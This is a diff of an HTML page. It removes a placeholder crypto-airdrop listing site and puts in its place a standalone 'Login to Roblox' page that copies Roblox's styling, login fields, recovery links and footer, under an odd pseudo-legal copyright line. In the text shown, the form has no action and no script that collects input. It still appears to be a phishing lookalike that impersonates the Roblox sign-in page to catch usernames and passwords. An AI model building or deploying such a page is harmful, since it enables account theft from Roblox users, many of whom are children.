@@ -3,551 +3,184 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Airdrop Collection</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link href="style.css" rel="stylesheet">
-    <script src="script.js"></script>
+    <title>Login to Roblox</title>
+    <link rel="shortcut icon" href="/OIP.webp" type="image/x-icon">
+
+<style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Gotham SSm', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        body {
+            background-color: #f7f7f7;
+            color: #1c1c1c;
+            line-height: 1.5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .login-container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            padding: 24px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        
+        .input-group {
+            margin-bottom: 16px;
+        }
+        
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #d9d9d9;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #00a2ff;
+        }
+        
+        .login-button {
+            background-color: #00a2ff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 12px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        
+        .login-button:hover {
+            background-color: #008fd9;
+        }
+        
+        .divider {
+            height: 1px;
+            background-color: #e5e5e5;
+            margin: 24px 0;
+        }
+        
+        .forgot-options {
+            margin-bottom: 24px;
+        }
+        
+        .forgot-heading {
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+        
+        .option-link {
+            color: #00a2ff;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        
+        .option-link:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            border-top: 1px solid #e5e5e5;
+            padding-top: 24px;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            margin-bottom: 16px;
+        }
+        
+        .footer-link {
+            color: #727272;
+            text-decoration: none;
+            font-size: 12px;
+            margin-right: 16px;
+            margin-bottom: 8px;
+        }
+        
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            font-size: 12px;
+            color: #727272;
+        }
+    </style>
 </head>
 <body>
-    <!-- Hero Section -->
-    <section class="hero" id="home">
-        <img src="image/home-image/textured-gradient-background-0410-5697130.webp" alt="Crypto background" class="hero-img">
-        <div class="hero-content">
-            <h1>Discover the Best Crypto Airdrops</h1>
-            <p>Get early access to legitimate cryptocurrency airdrops and earn free tokens from promising blockchain projects.</p>
-            <a href="#airdrops" class="btn">Explore Airdrops</a>
-        </div>
-    </section>
-
-    <!-- Icon-Based Header -->
-    <header class="header">
-        <a href="#" class="logo">NasDrop</a>
+    <div class="login-container">
+        <h1>Login to Roblox</h1>
         
-        <div class="nav-icons">
-            <a href="#home" class="nav-icon active" data-tooltip="Home">
-                <i class="fas fa-home"></i>
-            </a>
-            <a href="#airdrops" class="nav-icon" data-tooltip="Airdrops">
-                <i class="fas fa-gift"></i>
-            </a>
-            <a href="#about" class="nav-icon" data-tooltip="About">
-                <i class="fas fa-info-circle"></i>
-            </a>
-            <a href="#contact" class="nav-icon" data-tooltip="Contact">
-                <i class="fas fa-envelope"></i>
-            </a>
+        <div class="input-group">
+            <label for="username">Username/Email/Phone</label>
+            <input type="text" id="username" name="username">
         </div>
         
-        <div id="menu-icon" class="fas fa-bars"></div>
-    </header>
-
-    <!-- Airdrops Section -->
-    <section class="airdrops" id="airdrops">
-        <h2 class="heading">Latest <span>Airdrops</span></h2>
-        <div class="airdrops-container">
-            <!-- Airdrop 1-12 (visible by default) -->
-            <div class="airdrops-box visible">
-                <img src="image/home-image/Grass-Airdrop-Reached-Final-Stage-GRASS-token-Launching-Soon-1.jpg" alt="Airdrop 1" class="airdrop-image">
-                <span class="airdrop-status status-early">Early</span>
-                <h3>Blockchain Project 1</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 15, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 100 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 10,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-            
-            <!-- Airdrop 2 -->
-            <div class="airdrops-box visible">
-                <img src="image/home-image/layeredge" alt="Airdrop 2" class="airdrop-image">
-                <span class="airdrop-status status-late">Late</span>
-                <h3>Blockchain Project 2</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 10, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 150 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 15,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-    
-            <!-- Airdrop 3 -->
-            <div class="airdrops-box visible">
-                <img src="image/home-image/distribute-ai" alt="Airdrop 1" class="airdrop-image">
-                <span class="airdrop-status status-early">Early</span>
-                <h3>Blockchain Project 1</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 15, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 100 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 10,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-            
-            <!-- Airdrop 4 -->
-            <div class="airdrops-box visible">
-                <img src="image/home-image/despeed" alt="Airdrop 2" class="airdrop-image">
-                <span class="airdrop-status status-late">Late</span>
-                <h3>Blockchain Project 2</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 10, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 150 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 15,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-
-            <!-- Airdrop 5 -->
-            <div class="airdrops-box visible">
-                <img src="image/home-image/ORO" alt="Airdrop 1" class="airdrop-image">
-                <span class="airdrop-status status-early">Early</span>
-                <h3>Blockchain Project 1</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 15, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 100 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 10,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-            
-            <!-- Airdrop 6 -->
-            <div class="airdrops-box visible">
-                <img src="image/home-image/alkimiya" alt="Airdrop 2" class="airdrop-image">
-                <span class="airdrop-status status-late">Late</span>
-                <h3>Blockchain Project 2</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 10, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 150 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 15,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-
-            <!-- Airdrop 7 -->
-            <div class="airdrops-box visible">
-                <img src="https://via.placeholder.com/300x180?text=Airdrop+1" alt="Airdrop 1" class="airdrop-image">
-                <span class="airdrop-status status-early">Early</span>
-                <h3>Blockchain Project 1</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 15, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 100 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 10,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-            
-            <!-- Airdrop 8 -->
-            <div class="airdrops-box visible">
-                <img src="image/home-image/textured-gradient-background-0410-5697130.webp" alt="Airdrop 2" class="airdrop-image">
-                <span class="airdrop-status status-late">Late</span>
-                <h3>Blockchain Project 2</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 10, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 150 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 15,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-
-            <!-- Airdrop 9 -->
-            <div class="airdrops-box visible">
-                <img src="https://via.placeholder.com/300x180?text=Airdrop+1" alt="Airdrop 1" class="airdrop-image">
-                <span class="airdrop-status status-early">Early</span>
-                <h3>Blockchain Project 1</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 15, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 100 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 10,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-            
-            <!-- Airdrop 10 -->
-            <div class="airdrops-box visible">
-                <img src="image/home-image/textured-gradient-background-0410-5697130.webp" alt="Airdrop 2" class="airdrop-image">
-                <span class="airdrop-status status-late">Late</span>
-                <h3>Blockchain Project 2</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 10, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 150 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 15,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-
-            <!-- Airdrop 11 -->
-            <div class="airdrops-box visible">
-                <img src="https://via.placeholder.com/300x180?text=Airdrop+1" alt="Airdrop 1" class="airdrop-image">
-                <span class="airdrop-status status-early">Early</span>
-                <h3>Blockchain Project 1</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 15, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 100 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 10,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-            
-            <!-- Airdrop 12 -->
-            <div class="airdrops-box visible">
-                <img src="image/home-image/textured-gradient-background-0410-5697130.webp" alt="Airdrop 2" class="airdrop-image">
-                <span class="airdrop-status status-late">Late</span>
-                <h3>Blockchain Project 2</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 10, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 150 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 15,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-
-            <!-- Airdrop 13 -->
-            <div class="airdrops-box visible">
-                <img src="https://via.placeholder.com/300x180?text=Airdrop+1" alt="Airdrop 1" class="airdrop-image">
-                <span class="airdrop-status status-early">Early</span>
-                <h3>Blockchain Project 1</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 15, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 100 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 10,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-            
-            <!-- Airdrop 14 -->
-            <div class="airdrops-box visible">
-                <img src="image/home-image/textured-gradient-background-0410-5697130.webp" alt="Airdrop 2" class="airdrop-image">
-                <span class="airdrop-status status-late">Late</span>
-                <h3>Blockchain Project 2</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 10, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 150 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 15,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-
-            <!-- Airdrop 15 -->
-            <div class="airdrops-box visible">
-                <img src="https://via.placeholder.com/300x180?text=Airdrop+1" alt="Airdrop 1" class="airdrop-image">
-                <span class="airdrop-status status-early">Early</span>
-                <h3>Blockchain Project 1</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 15, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 100 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 10,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-            
-            <!-- Airdrop 2 -->
-            <div class="airdrops-box visible">
-                <img src="image/home-image/textured-gradient-background-0410-5697130.webp" alt="Airdrop 2" class="airdrop-image">
-                <span class="airdrop-status status-late">Late</span>
-                <h3>Blockchain Project 2</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 10, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 150 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 15,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-
-            <div class="airdrops-box visible">
-                <img src="https://via.placeholder.com/300x180?text=Airdrop+1" alt="Airdrop 1" class="airdrop-image">
-                <span class="airdrop-status status-early">Early</span>
-                <h3>Blockchain Project 1</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 15, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 100 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 10,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-            
-            <!-- Airdrop 16 -->
-            <div class="airdrops-box visible">
-                <img src="image/home-image/textured-gradient-background-0410-5697130.webp" alt="Airdrop 2" class="airdrop-image">
-                <span class="airdrop-status status-late">Late</span>
-                <h3>Blockchain Project 2</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 10, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 150 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 15,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-
-            <!-- Airdrop 17 -->
-            <div class="airdrops-box visible">
-                <img src="https://via.placeholder.com/300x180?text=Airdrop+1" alt="Airdrop 1" class="airdrop-image">
-                <span class="airdrop-status status-early">Early</span>
-                <h3>Blockchain Project 1</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 15, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 100 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 10,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-            
-            <!-- Airdrop 18 -->
-            <div class="airdrops-box visible">
-                <img src="image/home-image/textured-gradient-background-0410-5697130.webp" alt="Airdrop 2" class="airdrop-image">
-                <span class="airdrop-status status-late">Late</span>
-                <h3>Blockchain Project 2</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 10, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 150 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 15,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-            
-            <!-- Continue with boxes 3-12 following same pattern -->
-            
-            <!-- Airdrop 13-24 (hidden initially) -->
-            <div class="airdrops-box">
-                <img src="https://via.placeholder.com/300x180?text=Airdrop+13" alt="Airdrop 13" class="airdrop-image">
-                <span class="airdrop-status status-early">Early</span>
-                <h3>Blockchain Project 13</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Sep 15, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 120 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 8,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-
-            <div class="airdrops-box visible">
-                <img src="https://via.placeholder.com/300x180?text=Airdrop+1" alt="Airdrop 1" class="airdrop-image">
-                <span class="airdrop-status status-early">Early</span>
-                <h3>Blockchain Project 1</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 15, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 100 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 10,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-            
-            <!-- Airdrop 2 -->
-            <div class="airdrops-box visible">
-                <img src="image/home-image/textured-gradient-background-0410-5697130.webp" alt="Airdrop 2" class="airdrop-image">
-                <span class="airdrop-status status-late">Late</span>
-                <h3>Blockchain Project 2</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 10, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 150 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 15,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-    
-            <!-- Airdrop 3 -->
-            <div class="airdrops-box visible">
-                <img src="https://via.placeholder.com/300x180?text=Airdrop+1" alt="Airdrop 1" class="airdrop-image">
-                <span class="airdrop-status status-early">Early</span>
-                <h3>Blockchain Project 1</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 15, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 100 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 10,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-            
-            <!-- Airdrop 4 -->
-            <div class="airdrops-box visible">
-                <img src="image/home-image/textured-gradient-background-0410-5697130.webp" alt="Airdrop 2" class="airdrop-image">
-                <span class="airdrop-status status-late">Late</span>
-                <h3>Blockchain Project 2</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 10, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 150 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 15,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-
-            <!-- Airdrop 5 -->
-            <div class="airdrops-box visible">
-                <img src="https://via.placeholder.com/300x180?text=Airdrop+1" alt="Airdrop 1" class="airdrop-image">
-                <span class="airdrop-status status-early">Early</span>
-                <h3>Blockchain Project 1</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 15, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 100 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 10,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-            
-            <!-- Airdrop 6 -->
-            <div class="airdrops-box visible">
-                <img src="image/home-image/textured-gradient-background-0410-5697130.webp" alt="Airdrop 2" class="airdrop-image">
-                <span class="airdrop-status status-late">Late</span>
-                <h3>Blockchain Project 2</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 10, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 150 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 15,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-
-            <!-- Airdrop 7 -->
-            <div class="airdrops-box visible">
-                <img src="https://via.placeholder.com/300x180?text=Airdrop+1" alt="Airdrop 1" class="airdrop-image">
-                <span class="airdrop-status status-early">Early</span>
-                <h3>Blockchain Project 1</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 15, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 100 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 10,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-            
-            <!-- Airdrop 8 -->
-            <div class="airdrops-box visible">
-                <img src="image/home-image/textured-gradient-background-0410-5697130.webp" alt="Airdrop 2" class="airdrop-image">
-                <span class="airdrop-status status-late">Late</span>
-                <h3>Blockchain Project 2</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 10, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 150 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 15,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-
-            <!-- Airdrop 9 -->
-            <div class="airdrops-box visible">
-                <img src="https://via.placeholder.com/300x180?text=Airdrop+1" alt="Airdrop 1" class="airdrop-image">
-                <span class="airdrop-status status-early">Early</span>
-                <h3>Blockchain Project 1</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 15, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 100 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 10,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-            
-            <!-- Airdrop 10 -->
-            <div class="airdrops-box visible">
-                <img src="image/home-image/textured-gradient-background-0410-5697130.webp" alt="Airdrop 2" class="airdrop-image">
-                <span class="airdrop-status status-late">Late</span>
-                <h3>Blockchain Project 2</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 10, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 150 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 15,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-
-            <!-- Airdrop 11 -->
-            <div class="airdrops-box visible">
-                <img src="https://via.placeholder.com/300x180?text=Airdrop+1" alt="Airdrop 1" class="airdrop-image">
-                <span class="airdrop-status status-early">Early</span>
-                <h3>Blockchain Project 1</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Aug 15, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 100 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 10,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-            
-            
-            
-            <!-- Continue with boxes 3-12 following same pattern -->
-            
-            <!-- Airdrop 13-24 (hidden initially) -->
-            <div class="airdrops-box">
-                <img src="https://via.placeholder.com/300x180?text=Airdrop+13" alt="Airdrop 13" class="airdrop-image">
-                <span class="airdrop-status status-early">Early</span>
-                <h3>Blockchain Project 13</h3>
-                <div class="airdrop-info">
-                    <p><i class="fas fa-calendar"></i> Date: Sep 15, 2023</p>
-                    <p><i class="fas fa-coins"></i> Reward: 120 Tokens</p>
-                    <p><i class="fas fa-users"></i> Participants: 8,000+</p>
-                </div>
-                <a href="#" class="btn">Participate Now</a>
-            </div>
-            
-            <!-- Continue with boxes 14-24 following same pattern -->
+        <div class="input-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password">
         </div>
         
-        <div class="button-container">
-            <button class="show-more-btn">Show More <i class="fas fa-chevron-down"></i></button>
-            <button class="back-to-top"><i class="fas fa-arrow-up"></i> Back to Top</button>
-        </div>
-    </section>
-
-    <!-- About Section -->
-    <section class="about" id="about">
-        <h2 class="heading">About <span>Us</span></h2>
-        <div class="about-content">
-            <h3>Who We Are</h3>
-            <p>We are a dedicated team providing the latest and most valuable airdrop opportunities in the crypto space. Our mission is to help users discover legitimate projects and earn free tokens.</p>
-            <p>With years of experience in blockchain technology, we carefully vet each airdrop to ensure quality and legitimacy for our community.</p>
-            <a href="#contact" class="btn">Get In Touch</a>
-        </div>
-    </section>
-
-    <!-- Contact Section -->
-    <section class="contact" id="contact">
-        <h2 class="heading">Contact <span>Us</span></h2>
-        <div class="contact-content">
-            <p>Have questions or suggestions? Reach out to our team.</p>
-            <div class="contact-info">
-                <p><i class="fas fa-envelope"></i> contact@airdropalert.com</p>
-                <p><i class="fas fa-phone"></i> +1 (123) 456-7890</p>
-            </div>
-            <div class="social-links">
-                <a href="#"><i class="fab fa-twitter"></i></a>
-                <a href="#"><i class="fab fa-telegram"></i></a>
-                <a href="#"><i class="fab fa-discord"></i></a>
-                <a href="#"><i class="fab fa-medium"></i></a>
-            </div>
-        </div>
-    </section>
-
-    <!-- Footer -->
-    <footer class="footer">
-        <div class="footer-column">
-            <h4>Quick Links</h4>
-            <ul>
-                <li><a href="#home">Home</a></li>
-                <li><a href="#airdrops">Airdrops</a></li>
-                <li><a href="#about">About</a></li>
-                <li><a href="#contact">Contact</a></li>
-            </ul>
+        <button class="login-button">Login</button>
+        
+        <div class="divider"></div>
+        
+        <div class="forgot-options">
+            <div class="forgot-heading">Forgot Password or Username?</div>
+            <a href="#" class="option-link">Email Me a One-Time Code</a>
+            <a href="#" class="option-link">Login With Another Device</a>
         </div>
         
-        <div class="footer-column">
-            <h4>Contact Info</h4>
-            <p><i class="fas fa-envelope"></i> info@airdropalert.com</p>
-            <p><i class="fas fa-phone"></i> +123 456 7890</p>
-        </div>
+        <div class="divider"></div>
         
-        <div class="footer-column">
-            <h4>Follow Us</h4>
-            <div class="social-links">
-                <a href="#"><i class="fab fa-twitter"></i></a>
-                <a href="#"><i class="fab fa-telegram"></i></a>
-                <a href="#"><i class="fab fa-discord"></i></a>
-                <a href="#"><i class="fab fa-medium"></i></a>
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#" class="footer-link">About Us</a>
+                <a href="#" class="footer-link">Jobs</a>
+                <a href="#" class="footer-link">Blog</a>
+                <a href="#" class="footer-link">Parents</a>
+                <a href="#" class="footer-link">Gift Cards</a>
+                <a href="#" class="footer-link">Help</a>
+                <a href="#" class="footer-link">Terms</a>
+                <a href="#" class="footer-link">Accessibility</a>
+                <a href="#" class="footer-link">Privacy</a>
+                <a href="#" class="footer-link">Your Privacy Choices</a>
+            </div>
+            
+            <div class="copyright">
+                Active Web: Copyrights, notes, the views and content, suggestions are always our registered and compliant statements in the U.S. and other countries.
             </div>
         </div>
-        
-        <div class="footer-bottom">
-            <p>&copy; 2023 AirdropAlert. All Rights Reserved.</p>
-        </div>
-    </footer>
+    </div>
 </body>
 </html>
